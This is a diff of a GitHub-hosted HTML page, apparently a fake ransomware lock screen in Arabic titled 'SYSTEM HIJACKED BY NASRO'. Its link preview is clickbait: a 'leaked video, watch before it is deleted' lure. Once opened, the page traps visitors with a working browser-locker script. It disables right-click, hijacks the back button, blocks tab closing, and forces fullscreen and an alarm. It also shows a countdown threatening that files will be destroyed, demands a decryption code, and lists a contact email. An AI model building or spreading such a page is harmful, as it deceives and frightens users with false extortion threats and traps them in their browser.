@@ -5,9 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>⚠️ SYSTEM TERMINATED ⚠️</title>
 
-    <meta property="og:title" content="🔴 شاهد قبل الحذف: اختراق أجهزة الآلاف عبر هذا الفيديو!">
-    <meta property="og:description" content="تسريب فيديو خطير جداً يكشف ما يحدث في الخفاء.. شاهد الآن قبل أن يتم حظره من الإنترنت.">
-    <meta property="og:image" content="https://raw.githubusercontent.com/nassro0948-boop/nassro/main/hacker-thumbnail.jpg"> <meta property="og:url" content="https://nassro0948-boop.github.io/nassro/">
+    <meta property="og:title" content="🔴 شاهد قبل الحذف: فيديو مسرب كشف المستور!">
+    <meta property="og:description" content="أكثر من 5 مليون مشاهدة في ساعة واحدة.. شاهد الفيديو قبل أن يتم حظره.">
+    <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
+    <meta property="og:url" content="https://nassro0948-boop.github.io/nassro/">
     <meta property="og:type" content="video.other">
 
     <style>
@@ -20,20 +21,19 @@
         .box {
             position: relative; z-index: 10; background: rgba(0, 0, 0, 0.9);
             border: 3px solid #f00; padding: 40px; text-align: center;
-            box-shadow: 0 0 50px #f00; width: 85%; max-width: 600px;
+            box-shadow: 0 0 30px #f00; width: 80%; max-width: 600px;
         }
-        h1 { color: #f00; font-size: 2.2rem; text-shadow: 0 0 15px #f00; margin-bottom: 10px; }
-        .timer { font-size: 4rem; color: #f00; font-weight: bold; margin: 15px 0; text-shadow: 0 0 10px #f00; }
-        .warning { font-size: 1.1rem; color: #fff; margin-bottom: 20px; border-bottom: 1px solid #f00; padding-bottom: 10px; }
+        h1 { color: #f00; font-size: 2.5rem; text-shadow: 0 0 10px #f00; }
+        .warning { font-size: 1.2rem; color: #fff; margin: 20px 0; border-bottom: 1px solid #f00; padding-bottom: 10px; }
         input {
-            padding: 15px; width: 80%; background: #111; border: 1px solid #f00;
-            color: #f00; font-size: 22px; text-align: center; outline: none; margin-bottom: 15px;
+            padding: 15px; width: 70%; background: #111; border: 1px solid #0f0;
+            color: #0f0; font-size: 20px; text-align: center; outline: none;
         }
+        .timer { font-size: 3rem; color: #f00; font-weight: bold; margin: 20px 0; }
         button {
-            padding: 15px 30px; background: #f00; color: #fff;
-            border: none; cursor: pointer; font-weight: bold; width: 100%; font-size: 1.1rem;
+            margin-top: 20px; padding: 15px 30px; background: #f00; color: #fff;
+            border: none; cursor: pointer; font-weight: bold; width: 100%;
         }
-        button:hover { background: #b00; }
     </style>
 </head>
 <body oncontextmenu="return false;">
@@ -44,12 +44,12 @@
         <h1>SYSTEM HIJACKED BY NASRO</h1>
         <div class="timer" id="countdown">60</div>
         <div class="warning">
-            لا يمكنك الخروج! تم تشفير ملفاتك بنجاح.<br>
-            أدخل كود فك التشفير الآن أو سيتم تدمير النظام.
+            لا يمكنك الخروج إلا بالدفع، أنت الآن في قبضتي!<br>
+            سيتم تدمير ملفاتك عند انتهاء العداد.
         </div>
         <input type="password" id="pass" placeholder="أدخل كود فك التشفير">
         <button onclick="check()">فك التشفير الآن</button>
-        <p style="color: #444; margin-top: 20px; font-size: 12px;">Admin Console: nassro0948@gmail.com</p>
+        <p style="color: #666; margin-top: 20px;">Contact: nassro0948@gmail.com</p>
     </div>
 
     <audio id="alarm" loop>
@@ -62,7 +62,7 @@
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth;
         canvas.height = window.innerHeight;
-        const letters = "01NASRO0948$#!@%&*";
+        const letters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
         const fontSize = 16;
         const columns = canvas.width / fontSize;
         const drops = Array(Math.floor(columns)).fill(1);
@@ -78,23 +78,23 @@
         }
         setInterval(draw, 33);
 
-        // 2. تفعيل الصوت والملء التلقائي للشاشة
-        document.body.onclick = function() {
-            document.getElementById('alarm').play();
-            if (!document.fullscreenElement) {
-                document.documentElement.requestFullscreen().catch(err => {});
-            }
-        };
-
-        // 3. منع الرجوع للخلف (خدعة السجل)
+        // 2. منع الرجوع للخلف (خدعة السجل)
         history.pushState(null, null, location.href);
         window.onpopstate = function () {
             history.go(1);
-            alert("⚠️ تنبيه: محاولة الهروب تسرّع تدمير الملفات!");
+            alert("⚠️ قبضة نصرو لا ترحم! لا يمكنك الرجوع.");
         };
 
-        // 4. منع إغلاق الصفحة (الرسالة المنبثقة)
-        window.onbeforeunload = function() { return "إذا خرجت الآن ستفقد بياناتك للأبد!"; };
+        // 3. منع إغلاق التبويب
+        window.onbeforeunload = function() { return "إذا خرجت الآن ستدمر ملفاتك!"; };
+
+        // 4. تفعيل الصوت والملء التلقائي عند الضغط
+        document.body.onclick = function() {
+            document.getElementById('alarm').play();
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen();
+            }
+        };
 
         // 5. العداد التنازلي
         let timeLeft = 60;
@@ -104,28 +104,23 @@
             timerElement.innerText = timeLeft;
             if (timeLeft <= 0) {
                 clearInterval(interval);
-                document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20%; font-size:4rem;'>GAME OVER<br>SYSTEM DESTROYED</h1>";
-                setTimeout(() => { location.reload(); }, 3000);
+                alert("تم تدمير النظام بنجاح! وداعاً.");
+                location.reload();
             }
         }, 1000);
 
-        // 6. وظيفة التحقق
+        // 6. التحقق من الكود (مع جملتك الأصلية)
         function check() {
             const p = document.getElementById('pass').value;
             if(p === "0948") {
                 window.onbeforeunload = null;
-                alert("تم القبول.. تم إلغاء التدمير.");
+                alert("تم القبول.. أنت محظوظ هذه المرة.");
                 window.location.href = "https://google.com";
             } else {
-                alert("كود خاطئ! تم خصم 10 ثوانٍ كعقاب!");
-                timeLeft -= 10;
+                alert("كود خاطئ! العداد سيتسارع الآن!");
+                timeLeft -= 5;
             }
         }
     </script>
 </body>
 </html>
-     
-
-
-    
-   
